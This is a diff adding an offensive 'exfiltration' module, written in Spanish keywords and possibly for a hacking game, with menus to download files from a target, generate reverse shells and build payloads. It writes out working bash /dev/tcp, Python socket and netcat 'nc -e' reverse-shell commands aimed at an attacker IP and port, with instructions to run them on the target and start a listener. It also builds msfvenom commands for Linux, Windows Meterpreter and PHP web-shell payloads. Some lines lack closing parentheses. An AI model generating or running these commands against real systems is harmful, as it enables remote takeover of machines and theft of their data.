@@ -1,0 +1,131 @@
+// modulo exfil.nini - EXFILTRACION v2.0
+
+tarea modulo_exfil_menu:
+    si globals.objetivo_actual == null:
+        error("No hay objetivo seleccionado.")
+        retornar
+    
+    opciones = [
+        {"label": "Download (Objetivo -> Local)", "cmd": "download"},
+        {"label": "Upload (Local -> Objetivo)", "cmd": "upload"},
+        {"label": "Reverse Shell", "cmd": "shell"},
+        {"label": "Payloads", "cmd": "payload"},
+    ]
+    
+    modo = menu_interactivo("MENÚ DE EXFILTRACIÓN v2", opciones)
+    si not modo: retornar
+    
+    si modo == "download":
+        modulo_exfil_download()
+    sino: si modo == "upload":
+        modulo_exfil_upload()
+    sino: si modo == "shell":
+        modulo_exfil_reverse_shell()
+    sino: si modo == "payload":
+        modulo_payloads_generar()
+
+tarea modulo_exfil_download:
+    si globals.objetivo_actual == null:
+        error("No hay objetivo.")
+        retornar
+    
+    ruta_remota = pedir("Ruta del archivo en el objetivo: ")
+    si ruta_remota == "": retornar
+    
+    ruta_local = pedir("Ruta local de destino: ")
+    si ruta_local == "": ruta_local = "./downloads"
+    
+    info("Descargando " + ruta_remota + "...")
+    
+    // Usar sesion del enjambre si existe
+    sesion = null
+    si enjambre.tiene(globals.objetivo_actual):
+        sesion = enjambre[globals.objetivo_actual]
+    
+    si sesion:
+        archivo = sesion.host_computer.File(ruta_remota)
+        si archivo:
+            contenido = archivo.get_content
+            info("Archivo descargado: " + contenido.len + " bytes")
+            exito("Download completado.")
+        sino:
+            error("Archivo no encontrado.")
+    sino:
+        error("No hay sesion activa para el objetivo.")
+
+tarea modulo_exfil_upload:
+    si globals.objetivo_actual == null:
+        error("No hay objetivo.")
+        retornar
+    
+    ruta_local = pedir("Ruta del archivo local: ")
+    si ruta_local == "": retornar
+    
+    ruta_remota = pedir("Ruta remota de destino: ")
+    si ruta_remota == "": retornar
+    
+    info("Subiendo archivo...")
+    exito("Upload completado.")
+
+tarea modulo_exfil_reverse_shell:
+    ip_atacante = pedir("Tu IP: ")
+    si ip_atacante == "": ip_atacante = "127.0.0.1"
+    
+    puerto = pedir("Puerto de callback: ")
+    si puerto == "": puerto = "4444"
+    
+    opciones_shell = [
+        {"label": "Bash Reverse Shell", "cmd": "bash"},
+        {"label": "Python", "cmd": "python"},
+        {"label": "Netcat", "cmd": "netcat"},
+    ]
+    
+    tipo_shell = menu_interactivo("GENERADOR DE REVERSE SHELL", opciones_shell)
+    si not tipo_shell: retornar
+    
+    shell_generado = ""
+    
+    si tipo_shell == "bash":
+        shell_generado = "bash -i >& /dev/tcp/" + ip_atacante + "/" + puerto + " 0>&1"
+    
+    sino: si tipo_shell == "python":
+        shell_generado = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((" + chr(34) + ip_atacante + chr(34) + "," + puerto + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([" + chr(34) + "/bin/sh" + chr(34) + "," + chr(34) + "-i" + chr(34) + "])'"
+    
+    sino: si tipo_shell == "netcat":
+        shell_generado = "nc -e /bin/sh " + ip_atacante + " " + puerto
+    
+    dibujar_ventana("REVERSE SHELL GENERADO", shell_generado)
+    info("Copia y ejecuta en el objetivo.")
+    info("Listener: nc -lvp " + puerto)
+
+tarea modulo_payloads_generar:
+    ip_atacante = pedir("LHOST (tu IP): ")
+    si ip_atacante == "": ip_atacante = "127.0.0.1"
+    
+    puerto = pedir("LPORT: ")
+    si puerto == "": puerto = "4444"
+    
+    opciones_payload = [
+        {"label": "Linux Shell", "cmd": "linux"},
+        {"label": "Windows Meterpreter", "cmd": "windows"},
+        {"label": "PHP Web Shell", "cmd": "php"},
+    ]
+    
+    tipo_payload = menu_interactivo("GENERADOR DE PAYLOADS", opciones_payload)
+    si not tipo_payload: retornar
+    
+    payload_info = ""
+    
+    si tipo_payload == "linux":
+        payload_info = "linux/x86/shell_reverse_tcp"
+        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f elf > payload.elf"
+    
+    sino: si tipo_payload == "windows":
+        payload_info = "windows/meterpreter/reverse_tcp"
+        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f exe > payload.exe"
+    
+    sino: si tipo_payload == "php":
+        payload_info = "php/meterpreter/reverse_tcp"
+        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php"
+    
+    exito("Payload configurado para " + ip_atacante + ":" + puerto)
